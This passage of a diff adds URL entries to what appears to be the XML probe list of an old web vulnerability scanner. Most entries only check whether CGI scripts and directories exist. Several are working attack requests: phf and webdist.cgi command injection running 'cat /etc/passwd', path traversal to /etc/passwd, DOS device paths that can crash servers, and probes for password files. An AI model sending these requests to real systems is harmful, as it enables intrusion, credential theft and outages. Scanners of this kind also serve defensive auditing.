+   <get>/cgi-bin/pfdisplay</get>
+   <info>pfdisplay</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/pfdisplay.cgi</get>
+   <info>IRIX file reading;by Void;</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/pfdisplay.cgi?/../../../../etc/passwd</get>
+   <info>/cgi-bin/pfdisplay.cgi?/../../../../etc/passwd</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/phf</get>
+   <info>phf</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/phf.cgi</get>
+   <info>phf.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/phf.pp</get>
+   <info>Classic remote r00t;by Void;</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd</get>
+   <info>/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/phf?Qalias=x%0a/usr/bin/ypcat%20passwd</get>
+   <info>/cgi-bin/phf?Qalias=x%0a/usr/bin/ypcat%20passwd</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/php</get>
+   <info>php</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/php-cgi</get>
+   <info>/cgi-bin/php-cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/php.cgi</get>
+   <info>php.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/php.cgi?/etc/passwd</get>
+   <info>/cgi-bin/php.cgi?/etc/passwd</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/plusmail</get>
+   <info>plusmail</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/poll.cgi</get>
+   <info>/cgi-bin/poll.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/pollit/Poll_It_SSI_v2.0.cgi</get>
+   <info>/cgi-bin/pollit/Poll_It_SSI_v2.0.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/post_query</get>
+   <info>post_query</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/ppdscgi.exe</get>
+   <info>ppdscgi.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/printenv</get>
+   <info>printenv</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/program.pl</get>
+   <info>/cgi-bin/program.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/query</get>
+   <info>query</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/query_string.cgi</get>
+   <info>/cgi-bin/query_string.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/redir.exe</get>
+   <info>redir.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/redirect</get>
+   <info>redirect</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/responder.cgi</get>
+   <info>responder.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/rguest.exe</get>
+   <info>rguest.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/rmp_query</get>
+   <info>rmp_query</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/rpm_query</get>
+   <info>rpm_query hmm?</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/rwwwshell.pl</get>
+   <info>rwwwshell.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/sawmill5</get>
+   <info>/cgi-bin/sawmill5</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/search.cgi</get>
+   <info>search.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/search/tidfinder.cgi</get>
+   <info>tidfinder.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/sendform.cgi</get>
+   <info>@ny file retrieval;by Void;</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/snorkerz.bat</get>
+   <info>snorkerz.bat</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/snorkerz.cmd</get>
+   <info>snorkerz.cmd</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/sojourn.cgi</get>
+   <info>sojourn.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/spin_client.cgi</get>
+   <info>spin_client.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/stats.cgi</get>
+   <info>/cgi-bin/stats.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/stats.prg</get>
+   <info>stats.prg</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/statsconfig</get>
+   <info>statsconfig</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/subscribe.pl</get>
+   <info>/cgi-bin/subscribe.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/survey.cgi</get>
+   <info>survey.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/tablebuild.pl</get>
+   <info>tablebuild.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/test-cgi</get>
+   <info>test-cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/test-cgi.tcl</get>
+   <info>test-cgi.tcl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/test-cgi?*</get>
+   <info>/cgi-bin/test-cgi?*</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/test-unix.html</get>
+   <info>/cgi-bin/test-unix.html</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/test.bat</get>
+   <info>test.bat</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/test.cgi?/etc/passwd/*</get>
+   <info>[EXP] Test-cgi? /etc/passwd/</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/test.html</get>
+   <info>/cgi-bin/test.html</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/testcgi.exe</get>
+   <info>XITAMI testcgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/textcounter.pl</get>
+   <info>textcounter.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/tigvote.cgi</get>
+   <info>tigvote.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/tpgnrock</get>
+   <info>tpgnrock</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/tst.bat</get>
+   <info>tst.bat</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/ultraboard.cgi</get>
+   <info>ultraboard.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/ultraboard.pl</get>
+   <info>ultraboard.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/unlg1.1</get>
+   <info>unlg1.1</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/unlg1.2</get>
+   <info>unlg1.2</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/upload.pl</get>
+   <info>upload.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/uptime</get>
+   <info>/cgi-bin/uptime</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/view-source</get>
+   <info>view-sousce</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/view-source?../../../../etc/passwd</get>
+   <info>/cgi-bin/view-source?../../../../etc/passwd</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/visadmin.exe</get>
+   <info>/cgi-bin/visadmin.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/visitor.exe</get>
+   <info>visitor.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/w2-msql</get>
+   <info>w2-msql</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/w3-msql</get>
+   <info>w3-mspl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/w3tvars.pm</get>
+   <info>w3tvars.pm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/wa</get>
+   <info>/cgi-bin/wa</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/wais.pl</get>
+   <info>wais.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/webbbs.cgi</get>
+   <info>webbbs.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/webdist.cgi</get>
+   <info>webdist.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd</get>
+   <info>/cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/webgais</get>
+   <info>webgais</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/webmap.cgi</get>
+   <info>webmap.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/webplus</get>
+   <info>webplus</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/websendmail</get>
+   <info>websendmail</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/webutils.pl</get>
+   <info>webutils.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/webwho.pl</get>
+   <info>webwho.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/wguest.exe</get>
+   <info>wguest.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/whois.cgi</get>
+   <info>whois.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/whois_raw.cgi</get>
+   <info>whois_raw.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/wrap</get>
+   <info>wrap</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/wrap.cgi</get>
+   <info>IRIX remote exec;by Void;</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/wrap?/../../../../../etc</get>
+   <info>/cgi-bin/wrap?/../../../../../etc</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/www-sql</get>
+   <info>www-sql</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/wwwadmin.pl</get>
+   <info>Matt Wright board admin;by Void;</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/wwwboard.cgi</get>
+   <info>wwwboard.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/wwwboard.pl</get>
+   <info>wwwboard.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-dos/args.bat</get>
+   <info>args.bat</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-dos/args.cmd</get>
+   <info>args.cmd</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-home</get>
+   <info>/cgi-home</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-local</get>
+   <info>/cgi-local</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-shl/win-c-sample.exe</get>
+   <info>win-sample.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-win</get>
+   <info>/cgi-win</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-win/uploader.exe</get>
+   <info>uploader.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-win/wwwuploader.exe</get>
+   <info>wwwuploader.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgiwrap</get>
+   <info>/cgiwrap</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/classifieds.cgi</get>
+   <info>/classifieds.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/code</get>
+   <info>/code</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/code.php3</get>
+   <info>/code.php3</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/com1</get>
+   <info>This url can crash the web Server. If occurs upgrade to a new version</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/com2</get>
+   <info>com2 check</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/com3</get>
+   <info>com3 check</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/con</get>
+   <info>con check</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/con/con</get>
+   <info>con/con check ;-)</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/config</get>
+   <info>/config</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/config/check.txt</get>
+   <info>config/check.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/config/checks.txt</get>
+   <info>/config/checks.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/config/import.txt</get>
+   <info>config/import.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/config/mountain.cfg</get>
+   <info>mountain.cfg</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/config/orders.txt</get>
+   <info>/config/orders.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/counter</get>
+   <info>/counter</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/data</get>
+   <info>/data</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/database</get>
+   <info>/database</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/dev</get>
+   <info>/dev</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/development</get>
+   <info>/development</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/doc</get>
+   <info>Boa?? 8-)</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/eatme.pl</get>
+   <info>/eatme.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/edit.pl</get>
+   <info>/edit.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/environ.cgi</get>
+   <info>/environ.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/faxsurvey</get>
+   <info>/faxsurvey</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/filemail.pl</get>
+   <info>/filemail.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/files.pl</get>
+   <info>/files.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/finger</get>
+   <info>/finger</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/fun</get>
+   <info>/fun</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/getdrvrs.exe</get>
+   <info>tools/getdrvrs</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/gfx</get>
+   <info>/gfx</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/glimpse</get>
+   <info>/glimpse</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/global</get>
+   <info>/global</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/graphics</get>
+   <info>/graphics</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/guestbook.cgi</get>
+   <info>/guestbook.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/handler</get>
+   <info>/handler</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/hidden</get>
+   <info>/hidden</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/html/?PageServices</get>
+   <info>Administrator page for Netscape Server</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/htmlscript</get>
+   <info>/htmlscript</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/http://www.sux.com</get>
+   <info>proxy check?</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/image</get>
+   <info>/image</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/images</get>
+   <info>/images</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/img</get>
+   <info>/img</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/imgs</get>
+   <info>/imgs</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/includes</get>
+   <info>/includes</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/info</get>
+   <info>/info</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/info2www</get>
+   <info>/info2www</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/internal</get>
+   <info>/internal</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/java</get>
+   <info>/java</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/jj</get>
+   <info>/jj</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/log</get>
+   <info>/log</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/log.htm</get>
+   <info>/log.htm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/log.html</get>
+   <info>/log.html</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/log.shtml</get>
+   <info>/log.shtml</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/log.txt</get>
+   <info>/log.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/logs</get>
+   <info>/logs</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/logs.htm</get>
+   <info>/logs.htm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/logs.html</get>
+   <info>/logs.html</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/logs.shtml</get>
+   <info>/logs.shtml</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/logs.txt</get>
+   <info>/logs.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/lpt</get>
+   <info>lpt check</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/maillist.pl</get>
+   <info>/maillist.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/mall_log_files/order.log</get>
+   <info>/mall_log_files/order.log</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/man.sh</get>
+   <info>/man.sh</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/manage/cgi/cgiproc</get>
+   <info>cgi/cgiproc</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/members</get>
+   <info>/members</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/misc</get>
+   <info>/misc</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/mkstats</get>
+   <info>/mkstats</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/msadc/msadcs.dll</get>
+   <info>msadcs.dll</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/ncl_items.html</get>
+   <info>/ncl_items.html</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/neowebscript/test/senvironment.nhtml</get>
+   <info>senvironment</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/neowebscript/tests/load_webenv.nhtml</get>
+   <info>load_webenv</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/neowebscript/tests/mailtest.nhtml</get>
+   <info>mailtest.nhtml</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/new</get>
+   <info>/new</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/nph-publish</get>
+   <info>/nph-publish</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/nph-test-cgi</get>
+   <info>/nph-test-cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/officescan/cgi/jdkRqNotify.exe</get>
+   <info>jdkRqNotify.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/old</get>
+   <info>/old</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/order/order.log</get>
+   <info>/order/order.log</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/orders/checks.txt</get>
+   <info>orders/checks.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/orders/import.txt</get>
+   <info>orders/import.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/orders/mountain.cfg</get>
+   <info>mountain.cfg</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/orders/order.log</get>
+   <info>/orders/order.log</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/orders/orders.txt</get>
+   <info>/orders/orders.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/pass.txt</get>
+   <info>/pass.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/password.txt</get>
+   <info>/password.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/passwords.txt</get>
+   <info>/passwords.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/perl</get>
+   <info>/perl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/perl.exe</get>
+   <info>/perl.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/perl/files.pl</get>
+   <info>/perl/files.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/perlshop.cgi</get>
+   <info>/perlshop.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/pfdispaly.cgi</get>
+   <info>/pfdispaly.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/pfdisplay.cgi</get>
+   <info>/pfdisplay.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/phf</get>
+   <info>/phf</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/photoads</get>
+   <info>/photoads/</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/photoads/cgi-bin</get>
+   <info>/photoads/cgi-bin/</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/photoads/cgi-bin/env.cgi</get>
+   <info>/photoads/cgi-bin/env.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/php.cgi</get>
+   <info>/php.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/pics</get>
+   <info>/pics</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/piranha/secure/passwd.php3</get>
+   <info>passwd.php3</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/pix</get>
+   <info>/pix</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/priv</get>
+   <info>/priv</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/private</get>
+   <info>/private</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/publisher</get>
+   <info>Netscape's WebPublisher software, is an addon to Netscape-Enterprise servers, which allows file uploads and downloads, deleting and changing permissions on files. The WebPublisher installs by default in the /publisher directory on the webserver. This file is accessible for any third party user who can then install a local copy of the webpublisher or either run the remote version and gain access to the system.</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/publisher/|publisher</get>
+   <info>/publisher/|publisher</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/pw/storemgr.pw</get>
+   <info>storemgr.pw</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/python</get>
+   <info>/python</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/quikstore.cfg</get>
+   <info>quikstore.cfg</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/redir.cgi</get>
+   <info>/redir.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/redir.pl</get>
+   <info>/redir.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/redirect.cgi</get>
+   <info>/redirect.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/redirect.pl</get>
+   <info>/redirect.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/reports</get>
+   <info>/reports</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/restricted</get>
+   <info>/restricted</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/reviews/newpro.cgi</get>
+   <info>newpro.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/rguest.exe</get>
+   <info>/rguest.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/robots.txt</get>
+   <info>/robots.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/rwwwshell.pl</get>
+   <info>/rwwwshell.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/samples</get>
+   <info>/samples/</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/samples/isapi/srch.htm</get>
+   <info>isapi/srch.htm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/samples/search/queryhit.htm</get>
+   <info>queryhit.htm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/samples/search/webhits.exe</get>
+   <info>webhits.exe smpl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/save</get>
+   <info>/save</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/script</get>
+   <info>/script</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts</get>
+   <info>/scripts</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/CGImail.exe</get>
+   <info>CGImail.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/Fpadmcgi.exe</get>
+   <info>Fpadmcgi.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/c32web.exe</get>
+   <info>c32web.exe 2</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/c32web.exe/ChangeAdminPassword</get>
+   <info>c32web.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/cart32.exe</get>
+   <info>cart32.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/cart32.exe/cart32clientlist</get>
+   <info>cart32clientlist</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/cgimail.exe</get>
+   <info>NT sam._ retrieval;by Void;</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/convert.bas</get>
+   <info>convert.bas</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/counter.exe</get>
+   <info>counter.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/cpshost.dll</get>
+   <info>cpshost.dll</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/dbman/db.cgi</get>
+   <info>/scripts/dbman/db.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/fpcount.exe</get>
+   <info>fpcount.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/no-such-file.pl</get>
+   <info>/scripts/no-such-file.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/perl.exe</get>
+   <info>perl.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/perl?</get>
+   <info>scrp perl?</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/proxy/w3proxy.dll</get>
+   <info>w3proxy.dll</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/pu3.pl</get>
+   <info>ISS/perl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/run.exe</get>
+   <info>/scripts/run.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/samples/search/webhits.exe</get>
+   <info>webhits.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/submit.cgi</get>
+   <info>/submit.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/tools/dsnform.exe</get>
+   <info>/scripts/tools/dsnform.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/tools/getdrvrs.exe</get>
+   <info>getdrvrs.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/tools/getdrvs.exe</get>
+   <info>getdrvs.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/tools/newdsn.exe</get>
+   <info>newdsn.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/visadmin.exe</get>
+   <info>visadmin.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/wa.exe</get>
+   <info>/scripts/wa.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/scripts/webbbs.exe</get>
+   <info>webbbs.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/search</get>
+   <info>/search</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/search97.vts</get>
+   <info>search97.vts</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/secret</get>
+   <info>/secret</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/secure/.htaccess</get>
+   <info>secure/.htaccess</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/secure/.wwwacl</get>
+   <info>secure/.wwwacl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/server%20logfile</get>
+   <info>/server%20logfile</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/servlet</get>
+   <info>/servlet/</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/session/adminlogin?RCpage=/sysadmin/index.stm</get>
+   <info>/session/adminlogin?RCpage=/sysadmin/index.stm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/session/admnlogin</get>
+   <info>admnlogin</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/shtml</get>
+   <info>/shtml</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/source</get>
+   <info>/source</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/src</get>
+   <info>/src</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/srchadm</get>
+   <info>srchadm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/ss</get>
+   <info>/ss</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/ss.cfg</get>
+   <info>/ss.cfg</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/ssi/envout.bat</get>
+   <info>envout.bat</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/staff</get>
+   <info>/staff</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/statistic</get>
+   <info>/statistic</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/statistics</get>
+   <info>/statistics</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/stats</get>
+   <info>/stats</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/status</get>
+   <info>status</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/status.cgi</get>
